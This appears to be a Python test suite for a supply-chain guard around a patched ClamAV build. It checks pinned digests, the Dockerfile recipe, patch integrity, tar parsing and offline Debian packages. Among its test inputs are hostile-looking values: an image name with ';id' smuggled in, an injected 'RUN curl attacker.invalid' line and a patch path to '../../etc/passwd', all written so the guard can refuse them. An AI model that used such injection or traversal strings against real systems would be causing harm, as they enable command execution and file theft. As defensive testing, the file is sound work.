"""Pure build-input/patch guards. These never compile or execute native code."""
import contextlib
from datetime import datetime, timezone
import io
import json
import re
import tarfile
from pathlib import Path
import unittest
from unittest.mock import patch

from infra import evidence_native_build as build

ROOT = Path(__file__).resolve().parents[1]


def lock_document():
    rows = {name: {'bytes': 1, 'sha256': build.sha256(b'x')} for name in build.ARTIFACTS}
    rows['source.tar.gz']['sha256'] = build.SOURCE_SHA256
    rows['pillow.whl'] = {'bytes': build.PILLOW_BYTES, 'sha256': build.PILLOW_SHA256}
    rows['builder-packages.json'] = {'bytes': build.BUILDER_MAP_BYTES, 'sha256': build.BUILDER_MAP_SHA256}
    for name, digest in build.MODULE_PINS.items():
        raw = b'' if name == '__init__.py' else (ROOT/'backend/apps/operations'/name).read_bytes()
        rows['kapit_evidence/'+name] = {'bytes': len(raw), 'sha256': digest}
    return {'schema': 1, 'derived_version': '1.4.6-kapit-strict1',
            'builder_image': build.BUILDER_IMAGE,
            'runtime_image': build.RUNTIME_IMAGE, 'source_sha256': build.SOURCE_SHA256,
            'patch_sha256': build.sha256((ROOT/'infra/native/clamav_strict.patch').read_bytes()),
            'artifacts': rows, 'policy_sha256': build.WORKER_POLICY_SHA256,
            'signature_generation': 'c'*64}


def encoded(value):
    return json.dumps(value, separators=(',', ':')).encode()


class BuildInputTests(unittest.TestCase):
    def test_complete_pins_are_preparation_only(self):
        value = build.parse_lock(encoded(lock_document()))
        self.assertEqual(value['derived_version'], '1.4.6-kapit-strict1')
        self.assertNotIn('enabled', value)

    def test_builder_mutable_tag_or_shell_characters_refused(self):
        for image in ['debian:bookworm', 'docker.io/library/build@sha256:'+'a'*64+';id',
                      'docker.io/library/../build@sha256:'+'a'*64, '', None]:
            with self.subTest(image=image):
                value = lock_document(); value['builder_image'] = image
                with self.assertRaises(build.BuildUnavailable):
                    build.parse_lock(encoded(value))

    def test_runtime_or_upstream_source_substitution_refused(self):
        for field in ['runtime_image', 'source_sha256']:
            value = lock_document(); value[field] = 'b'*64
            with self.assertRaises(build.BuildUnavailable):
                build.parse_lock(encoded(value))

    def test_incomplete_or_extra_artifact_closure_refused(self):
        for change in ['missing', 'extra']:
            value = lock_document()
            if change == 'missing': del value['artifacts']['builder-packages.json']
            else: value['artifacts']['caller_pass.json'] = {'bytes': 1, 'sha256': 'a'*64}
            with self.assertRaises(build.BuildUnavailable): build.parse_lock(encoded(value))

    def test_no_caller_trust_boolean_or_duplicate_keys(self):
        value = lock_document(); value['verified'] = True
        for raw in [encoded(value), b'{"schema":1,"schema":1}', b'{"schema":NaN}',
                    b'{"schema":Infinity}', b'x'*16385, b'\xff']:
            with self.subTest(raw_size=len(raw)):
                with self.assertRaises(build.BuildUnavailable): build.parse_lock(raw)

    def test_boolean_negative_and_oversized_lengths_refused(self):
        for count in [True, 0, -1, 1024**3+1, 1.0]:
            value = lock_document(); value['artifacts']['pillow.whl']['bytes'] = count
            with self.assertRaises(build.BuildUnavailable): build.parse_lock(encoded(value))

    def test_artifact_bytes_length_and_digest_both_required(self):
        # Individual-byte binding, not a fabricated positive official source receipt.
        row = {'bytes': 1, 'sha256': build.sha256(b'x')}
        build._verify_bytes(row, b'x')
        for raw in [b'y', b'xx', bytearray(b'x')]:
            with self.assertRaises(build.BuildUnavailable): build._verify_bytes(row, raw)
        artifacts = {name: b'x' for name in build.ARTIFACTS}
        # A fake one-byte source cannot pass the pinned source hash, even if all
        # dictionary entries exist. Revalidate the complete lock at this boundary.
        with self.assertRaises(build.BuildUnavailable): build.verify_artifacts(lock_document(), artifacts)
        del artifacts['kapit_evidence/evidence_native_worker.py']
        with self.assertRaises(build.BuildUnavailable): build.verify_artifacts(lock_document(), artifacts)

    def test_recipe_only_replaces_reviewed_digest_token(self):
        value = lock_document(); patch_bytes = (ROOT/'infra/native/clamav_strict.patch').read_bytes()
        template = (ROOT/'infra/native/Dockerfile.evidence').read_bytes()
        result = build._fixed_recipe(template)
        self.assertNotIn(b'@@', result)
        self.assertIn(value['builder_image'].encode(), result)
        self.assertIn(b'--network=none', result)
        # Full runtime validation cannot bootstrap from declared/placeholder rows.
        with self.assertRaises(build.BuildUnavailable): build.render_recipe(encoded(value), patch_bytes, template)
        for altered in [patch_bytes+b' ', b'']:
            with self.assertRaises(build.BuildUnavailable): build.render_recipe(encoded(value), altered, template)
        for altered in [template+ b'@@REVIEWED_BUILDER_IMAGE@@', b'FROM mutable:latest']:
            with self.assertRaises(build.BuildUnavailable): build.render_recipe(encoded(value), patch_bytes, altered)
        # A single valid placeholder does not authorize unreviewed build commands.
        with self.assertRaises(build.BuildUnavailable):
            build.render_recipe(encoded(value), patch_bytes, template+b'\nRUN curl attacker.invalid\n')

    def test_path_precondition_rejects_cross_platform_escape(self):
        for name in ['../source', '/source', 'C:/source', 'a\\b', 'a/./b', 'a//b', 'a/../b']:
            self.assertFalse(build.archive_member_allowed(name), name)
        self.assertTrue(build.archive_member_allowed('clamav-1.4.6/libclamav/scanners.c'))

    def test_patch_pin_cannot_be_replaced_by_self_consistent_caller_hash(self):
        value = lock_document(); value['patch_sha256'] = build.sha256(b'caller patch')
        with self.assertRaises(build.BuildUnavailable): build.parse_lock(encoded(value))

    def test_default_performs_no_file_or_process_access(self):
        with patch('builtins.open', side_effect=AssertionError('file access')), \
             patch('subprocess.Popen', side_effect=AssertionError('child process')), \
             contextlib.redirect_stdout(io.StringIO()) as output:
            self.assertEqual(build.main(), 2)
        self.assertEqual(json.loads(output.getvalue()),
                         {'status': 'NATIVE_BUILD_INPUTS_REQUIRED', 'native_enabled': False})


class ExactSourcePatchTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        # Authenticate the complete public signed-source byte archive and read
        # eight bounded members in memory. No extraction, native code or child.
        cls.members = build._source_members((ROOT/'ai/state/private-scanner-source-review/clamav-1.4.6.source.tar.gz').read_bytes())
        cls.patch_bytes = (ROOT/'infra/native/clamav_strict.patch').read_bytes()

    def test_patch_applies_exact_verified_source_and_keeps_upstream_api(self):
        result = build.apply_exact_patch(self.members, self.patch_bytes)
        source = result['libclamav/scanners.c'].decode()
        self.assertIn('cl_error_t cl_scanmap_callback(', source)
        self.assertIn('cl_error_t cl_kapit_scanmap_strict_v1(', source)
        self.assertIn('return fault ? CL_ERROR : CL_CLEAN;', source)
        self.assertIn('kapit_strict.active', source)
        self.assertNotEqual(result['libclamav/clamav.h'], self.members['libclamav/clamav.h'])

    def test_changed_upstream_same_context_still_refused_by_hash(self):
        members = dict(self.members)
        members['libclamav/scanners.c'] += b'\n'
        with self.assertRaises(build.BuildUnavailable): build.apply_exact_patch(members, self.patch_bytes)

    def test_additive_pe_stats_getter_is_the_only_others_change_and_old_outputs_match(self):
        result=build.apply_exact_patch(self.members,self.patch_bytes)
        addition=(b'        case CL_ENGINE_DISABLE_PE_STATS:\n'
                  b'            return engine->engine_options & ENGINE_OPTIONS_DISABLE_PE_STATS;\n')
        self.assertEqual(result['libclamav/others.c'].count(addition),1)
        self.assertEqual(result['libclamav/others.c'].replace(addition,b'',1),self.members['libclamav/others.c'])
        old_outputs={
            'scanners.c':'4f41ecf599c6c284827ffcb3f58b841beeab67889cdf827a70dacbdd0ea3f82d',
            'clamav.h':'c947b04c0c58d2fb979086c529d51597f780c264fdc54bc861a8be99af23912a',
            'png.c':'d36ca6492fc94853e837a32805b04e649e2190afdd29be952e8c08c43daff41f',
            'jpeg.c':'e6b00f5ce31379e36dafe230ee51a5383d0114d6a4d2c1c00f1829f28adf76df',
            'matcher.c':'993d545542d0837c05612c27d3c2e004d14653a329fb610909ca8983c568a0c2',
            'libclamav.map':'34906fd0376b894935c8b3fe885c29c44aa87a05fe721320cc72de53fb7d6aac',
            'matcher-pcre.c':'6daac53d6451363baf65534f18eb1f4630f53fbc818203f6beb8cc637eee3fd1'}
        for name,digest in old_outputs.items():self.assertEqual(build.sha256(result['libclamav/'+name]),digest)
        getter=result['libclamav/others.c'].split(b'long long cl_engine_get_num',1)[1]
        self.assertIn(addition,getter)
        # Evaluate the exact mask expression, not a native getter invocation.
        self.assertRegex(self.members['libclamav/clamav.h'].decode(),r'#define ENGINE_OPTIONS_DISABLE_PE_STATS\s+0x4')
        for options,expected in ((0,0),(1,0),(2,0),(4,4),(5,4),(7,4)):
            self.assertEqual(options & 0x4,expected)
        recipe=(ROOT/'infra/native/Dockerfile.evidence').read_bytes()
        self.assertIn(b'patched/libclamav/others.c /build/source/libclamav/',recipe)
        self.assertIn((build.sha256(result['libclamav/others.c'])+'  /build/source/libclamav/others.c').encode(),recipe)

    def test_missing_changed_or_wrong_mask_eighth_member_refused(self):
        missing=dict(self.members);del missing['libclamav/others.c']
        changed=dict(self.members);changed['libclamav/others.c']+=b'\n'
        for members in (missing,changed):
            with self.assertRaises(build.BuildUnavailable):build.apply_exact_patch(members,self.patch_bytes)
        altered=self.patch_bytes.replace(b'+            return engine->engine_options & ENGINE_OPTIONS_DISABLE_PE_STATS;',
                                        b'+            return engine->engine_options & ENGINE_OPTIONS_DISABLE_CACHE;')
        self.assertNotEqual(altered,self.patch_bytes)
        with self.assertRaises(build.BuildUnavailable):build.apply_exact_patch(self.members,altered)

    def test_raw_pcre_result_is_observed_before_timing_report_or_normalization(self):
        result = build.apply_exact_patch(self.members, self.patch_bytes)
        source = result['libclamav/matcher-pcre.c'].decode()
        call = 'rc = cli_pcre_match(pd, buffer + adjbuffer, adjlength, offset, options, &p_res);'
        hook = ('            if (rc == 0 || (rc < 0 && rc != PCRE2_ERROR_NOMATCH))\n'
                '                cli_kapit_observe_v1(CL_ERROR);\n')
        self.assertEqual(source.count(hook), 1)
        self.assertIn(call+'\n'+hook+'            cli_event_time_stop(', source)
        self.assertLess(source.index(hook), source.index('cli_pcre_report(pd,'))
        self.assertLess(source.index(hook), source.index('if (rc < 0 && p_res.err != CL_SUCCESS)'))
        # Removing the inserted observer recovers the actual upstream local block:
        # no rc/result/return mutation, logging, or changed branch follows the call.
        upstream = self.members['libclamav/matcher-pcre.c'].decode()
        self.assertEqual(source.replace(hook, '').split(call, 1)[1].split('/* matched,', 1)[0],
                         upstream.split(call, 1)[1].split('/* matched,', 1)[0])
        scanner = result['libclamav/scanners.c'].decode()
        observer = scanner.split('void cli_kapit_observe_v1(cl_error_t result)', 1)[1].split('}', 1)[0]
        self.assertIn('kapit_strict.active && result != CL_CLEAN && result != CL_VIRUS', observer)
        self.assertIn('kapit_strict.fault = 1;', observer)

    def test_actual_raw_pcre_predicate_boundaries(self):
        # Interpret only the exact reviewed C predicate; this is not a native
        # PCRE execution or a claim that zero is reachable with normal match data.
        source = build.apply_exact_patch(self.members, self.patch_bytes)['libclamav/matcher-pcre.c'].decode()
        match = re.search(r'if \((rc == 0 \|\| \(rc < 0 && rc != PCRE2_ERROR_NOMATCH\))\)\n'
                          r'                cli_kapit_observe_v1\(CL_ERROR\);', source)
        self.assertIsNotNone(match)
        expression = match.group(1).replace('||', 'or').replace('&&', 'and')
        code = compile(expression, '<reviewed PCRE predicate>', 'eval')
        # PCRE2's public raw return constants: NOMATCH=-1, CALLOUT=-37,
        # MATCHLIMIT=-47, NOMEMORY=-48, DEPTHLIMIT/RECURSIONLIMIT=-53.
        for rc, expected in [(-1, False), (-37, True), (-47, True), (-48, True),
                             (-53, True), (-999, True), (0, True), (1, False), (9, False)]:
            with self.subTest(rc=rc):
                self.assertIs(eval(code, {'__builtins__': {}}, {'rc': rc, 'PCRE2_ERROR_NOMATCH': -1}), expected)

    def test_raw_pcre_observer_removal_or_narrowing_is_not_pinned_patch(self):
        for before, after in [(b'rc == 0 || (rc < 0 && rc != PCRE2_ERROR_NOMATCH)',
                               b'rc < 0 && p_res.err != CL_SUCCESS'),
                              (b'cli_kapit_observe_v1(CL_ERROR);', b'cli_kapit_observe_v1(CL_SUCCESS);')]:
            changed = self.patch_bytes.replace(before, after, 1)
            self.assertNotEqual(changed, self.patch_bytes)
            with self.assertRaises(build.BuildUnavailable):
                build.apply_exact_patch(self.members, changed)

    def test_context_and_hunk_position_tampering_refused_without_fuzz(self):
        for altered in [self.patch_bytes.replace(b'bool halt_scan = false;', b'bool halt_scan = true;', 1),
                        self.patch_bytes.replace(b'@@ -4124,', b'@@ -4123,', 1)]:
            self.assertNotEqual(altered, self.patch_bytes)
            with self.assertRaises(build.BuildUnavailable): build.apply_exact_patch(self.members, altered)

    def test_other_member_or_duplicate_patch_refused(self):
        for altered in [self.patch_bytes.replace(b'a/libclamav/scanners.c', b'a/../../etc/passwd', 1),
                        self.patch_bytes+self.patch_bytes]:
            with self.assertRaises(build.BuildUnavailable): build.apply_exact_patch(self.members, altered)

    def test_well_formed_added_line_substitution_is_not_a_reviewed_patch(self):
        altered = self.patch_bytes.replace(b'+    return 1;', b'+    return 0;', 1)
        self.assertNotEqual(altered, self.patch_bytes)
        with self.assertRaises(build.BuildUnavailable):
            build.apply_exact_patch(self.members, altered)

    def test_pre_normalization_error_latch_and_skipped_layer_guard(self):
        # Source-placement checks, not execution of the C scanner or completeness proof.
        source = build.apply_exact_patch(self.members, self.patch_bytes)['libclamav/scanners.c'].decode()
        normalizer = source[source.index('static inline bool result_should_goto_done'):]
        self.assertLess(normalizer.index('cli_kapit_observe_v1(result_in)'), normalizer.index('switch (result_in)'))
        self.assertIn('result != CL_CLEAN && result != CL_VIRUS', source)
        self.assertIn('!kapit_layer_complete) kapit_strict.fault = 1', source)
        self.assertIn('!kapit_strict.raw || !kapit_strict.image || !kapit_strict.complete', source)
        self.assertIn('scanoptions->parse != CL_SCAN_PARSE_IMAGE', source)

    def test_deep_parser_and_matcher_clean_conversion_hooks_are_in_exact_patch(self):
        # Placement assertions complement, and cannot replace, native failure tests.
        result = build.apply_exact_patch(self.members, self.patch_bytes)
        png = result['libclamav/png.c'].decode()
        jpeg = result['libclamav/jpeg.c'].decode()
        matcher = result['libclamav/matcher.c'].decode()
        pcre = result['libclamav/matcher-pcre.c'].decode()
        self.assertIn('cli_kapit_observe_v1(CL_EFORMAT);\n                cli_dbgmsg("PNG: invalid IHDR length', png)
        self.assertIn('if (!kapit_sos) cli_kapit_observe_v1(CL_EFORMAT)', jpeg)
        self.assertIn('cli_kapit_observe_v1(status);\n                    if (status == CL_BREAK)', jpeg)
        self.assertIn('cli_kapit_observe_v1(CL_EREAD);\n            ret = CL_EREAD;\n            goto done;', matcher)
        self.assertIn('cli_kapit_observe_v1(p_res.err);\n            ret = p_res.err;', pcre)
        self.assertIn('if (pm->flags & CLI_PCRE_DISABLED) {\n            cli_kapit_observe_v1(CL_EARG);', pcre)
        exports = result['libclamav/libclamav.map'].decode()
        self.assertIn('    cl_kapit_scanmap_strict_v1;', exports)
        self.assertIn('    cl_kapit_strict_abi_v1;', exports)
        self.assertNotIn('    cli_kapit_observe_v1;', exports)


NOW = datetime(2026, 10, 22, 1, tzinfo=timezone.utc)


def runtime_inputs():
    artifacts = {'kapit_evidence/'+name: (b'' if name == '__init__.py' else
                  (ROOT/'backend/apps/operations'/name).read_bytes()) for name in build.MODULE_PINS}
    # Synthetic public stand-ins are used solely to exercise byte binding. They
    # cannot load as official CVDs or as the actual native library.
    artifacts.update({name: ('synthetic-'+name).encode() for name in build.CVDS})
    rows = [{'name': name, 'sha256': build.sha256(artifacts[name]), 'version': 1,
             'signed_at': '2026-10-21T00:00:00Z', 'verification_receipt_sha256': 'e'*64}
            for name in sorted(build.CVDS)]
    artifacts['signature-files.json'] = encoded(rows)
    lock = lock_document()
    for name, raw in artifacts.items():
        lock['artifacts'][name] = {'bytes': len(raw), 'sha256': build.sha256(raw)}
    lock['signature_generation'] = build.signature_generation(artifacts['signature-files.json'],
                                                             {k: artifacts[k] for k in build.CVDS}, now=NOW)
    return lock, artifacts


class WorkerPackagingTests(unittest.TestCase):
    def test_actual_frozen_modules_and_empty_init_match_worker_configuration_shape(self):
        from backend.apps.operations.evidence_native_worker import parse_configuration
        lock, artifacts = runtime_inputs()
        raw = build.make_runtime_configuration(encoded(lock), artifacts, b'synthetic-not-a-native-library', now=NOW)
        result = parse_configuration(raw)
        self.assertEqual(result['signature_generation'], lock['signature_generation'])
        self.assertEqual(result['files']['__init__.py'], build.sha256(b''))
        self.assertEqual(result['files']['clamav'], build.sha256(b'synthetic-not-a-native-library'))
        self.assertNotIn('ready', result)
        self.assertNotIn('passed', result)

    def test_package_names_module_bytes_and_generation_cannot_be_substituted(self):
        lock, artifacts = runtime_inputs()
        changed = dict(artifacts); changed['kapit_evidence/evidence_native_worker.py'] += b'\n'
        with self.assertRaises(build.BuildUnavailable): build.make_runtime_configuration(encoded(lock), changed, b'x', now=NOW)
        for alias in ['worker.py', 'confinement.py', 'kapit_evidence/settings.py']:
            changed = dict(artifacts); changed[alias] = b'x'
            with self.assertRaises(build.BuildUnavailable): build.make_runtime_configuration(encoded(lock), changed, b'x', now=NOW)
        lock['signature_generation'] = 'a'*64
        with self.assertRaises(build.BuildUnavailable): build.make_runtime_configuration(encoded(lock), artifacts, b'x', now=NOW)

    def test_signature_metadata_hashes_versions_dates_duplicates_and_order_are_closed(self):
        _, artifacts = runtime_inputs()
        original = json.loads(artifacts['signature-files.json'])
        cvds = {name: artifacts[name] for name in build.CVDS}
        for field, value in [('version', True), ('signed_at', '2040-01-01T00:00:00Z'),
                             ('sha256', 'f'*64), ('caller_pass', True)]:
            rows = [dict(row) for row in original]; rows[0][field] = value
            with self.subTest(field=field), self.assertRaises(build.BuildUnavailable):
                build.signature_generation(encoded(rows), cvds, now=NOW)
        for rows in [list(reversed(original)), [original[0], original[0], original[2]], original[:2]]:
            with self.assertRaises(build.BuildUnavailable): build.signature_generation(encoded(rows), cvds, now=NOW)
        changed = dict(cvds); changed['daily.cvd'] += b'x'
        with self.assertRaises(build.BuildUnavailable): build.signature_generation(encoded(original), changed, now=NOW)
        with self.assertRaises(build.BuildUnavailable): build.signature_generation(encoded(original), cvds, now=NOW.replace(tzinfo=None))

    def test_metadata_and_module_lock_hashes_are_not_caller_trust_flags(self):
        lock, artifacts = runtime_inputs()
        for key in ['policy_sha256', 'signature_generation']:
            changed = dict(lock); changed[key] = '0'*64
            with self.assertRaises(build.BuildUnavailable): build.parse_lock(encoded(changed))
        lock['artifacts']['kapit_evidence/__init__.py']['bytes'] = 1
        with self.assertRaises(build.BuildUnavailable): build.parse_lock(encoded(lock))
        with self.assertRaises(build.BuildUnavailable): build.parse_lock(encoded(lock_document()).decode().encode('utf-16'))

    def test_compiled_library_is_postcompile_binding_not_prebuild_circular_input(self):
        lock, artifacts = runtime_inputs()
        first = json.loads(build.make_runtime_configuration(encoded(lock), artifacts, b'first-output', now=NOW))
        second = json.loads(build.make_runtime_configuration(encoded(lock), artifacts, b'second-output', now=NOW))
        self.assertNotEqual(first['files']['clamav'], second['files']['clamav'])
        self.assertEqual(first['signature_generation'], second['signature_generation'])
        self.assertNotIn('clamav', lock['artifacts'])
        with self.assertRaises(build.BuildUnavailable): build.make_runtime_configuration(encoded(lock), artifacts, b'', now=NOW)

    def test_final_recipe_uses_isolated_module_and_hash_only_validation(self):
        recipe = (ROOT/'infra/native/Dockerfile.evidence').read_text()
        self.assertIn('COPY kapit_evidence/ /usr/local/lib/python3.14/site-packages/kapit_evidence/', recipe)
        self.assertIn('"-m", "kapit_evidence.evidence_native_worker"', recipe)
        self.assertIn('from kapit_evidence.evidence_native_worker import load_configuration; load_configuration()', recipe)
        self.assertNotIn('COPY worker.py', recipe)
        self.assertNotIn('confinement.py', recipe)
        self.assertIn(build.PILLOW_SHA256.encode(), build.pillow_requirements())
        # A made-up wheel cannot complete the final packaging context.
        lock, artifacts = runtime_inputs(); artifacts['pillow.whl'] = b'not-the-official-wheel'
        with self.assertRaises(build.BuildUnavailable): build.runtime_context_files(encoded(lock), artifacts, b'x', now=NOW)


def deb_tar(entries):
    stream = io.BytesIO()
    with tarfile.open(fileobj=stream, mode='w', format=tarfile.USTAR_FORMAT) as archive:
        for name, data, kind in entries:
            item = tarfile.TarInfo(name); item.size = len(data); item.mode = 0o644
            item.type = kind
            if kind in (tarfile.SYMTYPE, tarfile.LNKTYPE): item.linkname = 'synthetic-target'
            archive.addfile(item, io.BytesIO(data))
    return stream.getvalue()


class OfflineBuilderTests(unittest.TestCase):
    def setUp(self):
        self.metadata = (ROOT/'ai/state/private-scanner-builder-packages.json').read_bytes()
        self.expected = {'a.deb': {'bytes': 3, 'sha256': build.sha256(b'one')},
                         'b.deb': {'bytes': 3, 'sha256': build.sha256(b'two')}}
        self.archive = deb_tar([('a.deb', b'one', tarfile.REGTYPE), ('b.deb', b'two', tarfile.REGTYPE)])

    def test_exact_seventeen_map_is_source_pinned_not_a_caller_signed_index_claim(self):
        actual = build.builder_packages(self.metadata)
        self.assertEqual(len(actual), 17)
        self.assertEqual(sum(row['bytes'] for row in actual.values()), 71194312)
        for mutate in ['hash', 'pool', 'verified']:
            doc = json.loads(self.metadata)
            if mutate == 'hash': doc['packages'][0]['sha256'] = 'f'*64
            elif mutate == 'pool': doc['packages'][0]['filename'] = '../untrusted.deb'
            else: doc['verified'] = True
            with patch.object(build, '_regular_tar_members', side_effect=AssertionError('archive parsed too soon')):
                with self.assertRaises(build.BuildUnavailable): build.builder_deb_context(encoded(doc), self.archive)

    def test_real_ustar_regular_bytes_returned_with_size_and_digest_checks(self):
        # Generic tiny tar fixture proves parser behavior, not real Debian closure.
        self.assertEqual(build._regular_tar_members(self.archive, self.expected), {'a.deb': b'one', 'b.deb': b'two'})
        altered = self.archive.replace(b'one', b'bad', 1)
        with self.assertRaises(build.BuildUnavailable): build._regular_tar_members(altered, self.expected)
        for raw in [self.archive[:-512], self.archive[:700], self.archive+b'x'*512, self.archive+self.archive]:
            if raw == self.archive[:-512]:
                # Removing only surplus zero padding can still be a complete tar.
                self.assertEqual(build._regular_tar_members(raw, self.expected)['a.deb'], b'one')
            else:
                with self.assertRaises(build.BuildUnavailable): build._regular_tar_members(raw, self.expected)

    def test_tar_links_extensions_paths_duplicates_extra_and_missing_members_refuse(self):
        for entries in [
            [('a.deb', b'one', tarfile.SYMTYPE), ('b.deb', b'two', tarfile.REGTYPE)],
            [('a.deb', b'one', tarfile.LNKTYPE), ('b.deb', b'two', tarfile.REGTYPE)],
            [('a.deb', b'one', tarfile.XHDTYPE), ('b.deb', b'two', tarfile.REGTYPE)],
            [('../a.deb', b'one', tarfile.REGTYPE), ('b.deb', b'two', tarfile.REGTYPE)],
            [('a.deb', b'one', tarfile.REGTYPE), ('a.deb', b'one', tarfile.REGTYPE)],
            [('a.deb', b'one', tarfile.REGTYPE)],
            [('a.deb', b'one', tarfile.REGTYPE), ('b.deb', b'two', tarfile.REGTYPE), ('extra.deb', b'x', tarfile.REGTYPE)],
        ]:
            with self.subTest(names=[row[0] for row in entries]), self.assertRaises(build.BuildUnavailable):
                build._regular_tar_members(deb_tar(entries), self.expected)

    def test_tar_checksum_huge_declared_size_nonzero_padding_and_missing_end_refuse(self):
        changed = bytearray(self.archive); changed[0] ^= 1
        with self.assertRaises(build.BuildUnavailable): build._regular_tar_members(bytes(changed), self.expected)
        changed = bytearray(self.archive); changed[124:136] = b'77777777777\0'; changed[148:156] = b' '*8
        checksum = sum(changed[:512]); changed[148:156] = ('%06o\0 ' % checksum).encode()
        with self.assertRaises(build.BuildUnavailable): build._regular_tar_members(bytes(changed), self.expected)
        changed = bytearray(self.archive); changed[515] = 1
        with self.assertRaises(build.BuildUnavailable): build._regular_tar_members(bytes(changed), self.expected)
        with self.assertRaises(build.BuildUnavailable): build._regular_tar_members(self.archive[:2048], self.expected)

    def test_no_real_deb_closure_no_context_even_with_all_expected_names(self):
        expected = build.builder_packages(self.metadata)
        fake = deb_tar([(name, b'x', tarfile.REGTYPE) for name in expected])
        with self.assertRaises(build.BuildUnavailable): build.builder_deb_context(self.metadata, fake)

    def test_source_build_stops_before_archive_processing_on_wrong_signature_or_space(self):
        template = (ROOT/'infra/native/Dockerfile.evidence').read_bytes()
        patch_bytes = (ROOT/'infra/native/clamav_strict.patch').read_bytes()
        for free in [True, -1, build.MIN_BUILD_FREE_BYTES-1]:
            with patch.object(build, '_source_members', side_effect=AssertionError('source parsed too soon')):
                with self.assertRaises(build.BuildUnavailable):
                    build.source_build_inputs(b'not source', b'not signature', patch_bytes, self.metadata, self.archive, template, free_bytes=free)
        with patch.object(build.tarfile, 'open', side_effect=AssertionError('unverified gzip parsed')):
            with self.assertRaises(build.BuildUnavailable): build._source_members(b'untrusted gzip')
        with self.assertRaises(build.BuildUnavailable):
            build.source_build_inputs(b'not source', b'not signature', patch_bytes, self.metadata, self.archive, template, free_bytes=7*1024**3)

    def test_official_dependency_stage_is_offline_exact_and_source_overlay_only(self):
        recipe = (ROOT/'infra/native/Dockerfile.evidence').read_text()
        self.assertIn('FROM '+build.BUILDER_IMAGE+' AS dependencies', recipe)
        self.assertIn('FROM dependencies AS build', recipe)
        self.assertNotIn('@@', recipe)
        self.assertIn('CARGO_BUILD_JOBS=2 CMAKE_BUILD_PARALLEL_LEVEL=2', recipe)
        self.assertIn('dpkg --install /opt/builder-debs/', recipe)
        self.assertNotIn('apt-get update', '\n'.join(line for line in recipe.splitlines() if not line.startswith('#')))
        self.assertIn('COPY source.tar.gz', recipe)
        self.assertNotIn('COPY source/', recipe)
        self.assertIn('--strip-components=1 --no-same-owner --no-same-permissions', recipe)
        self.assertIn('WORKDIR /scratch', recipe); self.assertIn('CMD []', recipe)
        for row in json.loads(self.metadata)['packages']:
            self.assertIn('/opt/builder-debs/'+row['basename'], recipe)

    def test_dpkg_exact_closure_audit_and_installed_status_are_mandatory(self):
        template = (ROOT/'infra/native/Dockerfile.evidence').read_bytes()
        recipe = template.decode()
        install = next(line for line in recipe.splitlines() if ' dpkg --install ' in line)
        actual = install.split('dpkg --install ', 1)[1].split(' &&', 1)[0].split()
        rows = json.loads(self.metadata)['packages']
        self.assertEqual(actual, ['/opt/builder-debs/'+row['basename'] for row in rows])
        self.assertNotIn('apt-get', recipe)
        self.assertNotIn('APT_CONFIG=', recipe)
        self.assertNotIn('||', recipe)
        audit = 'dpkg --audit > /tmp/kapit-build-apt/audit 2>&1 && test ! -s /tmp/kapit-build-apt/audit &&'
        compare = 'cmp /tmp/kapit-build-apt/required-expected /tmp/kapit-build-apt/required-installed &&'
        self.assertIn(audit, recipe)
        self.assertLess(recipe.index(' dpkg --install '), recipe.index(audit))
        self.assertLess(recipe.index(audit), recipe.index(compare))
        self.assertLess(recipe.index(compare), recipe.index('FROM dependencies AS build'))
        for row in rows:
            self.assertIn("'"+row['package']+'\\t'+row['version']+'\\t'+row['architecture']+"\\tinstalled'", recipe)
        self.assertIn('${db:Status-Status}', recipe)
        build._fixed_recipe(template)
        for before, after in [(audit, 'true &&'), (compare, 'true &&'),
                              ('\\tinstalled', '\\tunpacked'), ('dpkg --install ', 'dpkg --unpack ')]:
            with self.subTest(before=before):
                changed = template.replace(before.encode(), after.encode())
                self.assertNotEqual(template, changed)
                with self.assertRaises(build.BuildUnavailable): build._fixed_recipe(changed)

    def test_postinstall_toolchain_record_requires_all_seventeen_versions_and_hashes(self):
        doc = json.loads(self.metadata)
        packages = ''.join(row['package']+'\t'+row['version']+'\t'+row['architecture']+'\n' for row in doc['packages']).encode()
        versions = b'synthetic tool version fixture, not actual build output'
        record = {'schema': 1, 'purpose': 'offline-builder-toolchain-v1', 'base_image': build.BUILDER_IMAGE,
                  'builder_packages_sha256': build.BUILDER_MAP_SHA256, 'baseline_status_sha256': doc['baseline_status_sha256'],
                  'baseline_inventory_sha256': doc['baseline_inventory_sha256'], 'installed_inventory_sha256': build.sha256(packages),
                  'tool_versions_sha256': build.sha256(versions), 'installed_status_sha256': 'a'*64}
        build.verify_toolchain_inventory(encoded(record), packages, versions, self.metadata)
        for changed_packages in [packages.replace(b'libclang1-14\t1:14.0.6-12', b'libclang1-14\t1:14.0.6-11'), b'']:
            changed = dict(record); changed['installed_inventory_sha256'] = build.sha256(changed_packages)
            with self.assertRaises(build.BuildUnavailable): build.verify_toolchain_inventory(encoded(changed), changed_packages, versions, self.metadata)
        record['verified'] = True
        with self.assertRaises(build.BuildUnavailable): build.verify_toolchain_inventory(encoded(record), packages, versions, self.metadata)


if __name__ == '__main__':
    unittest.main()
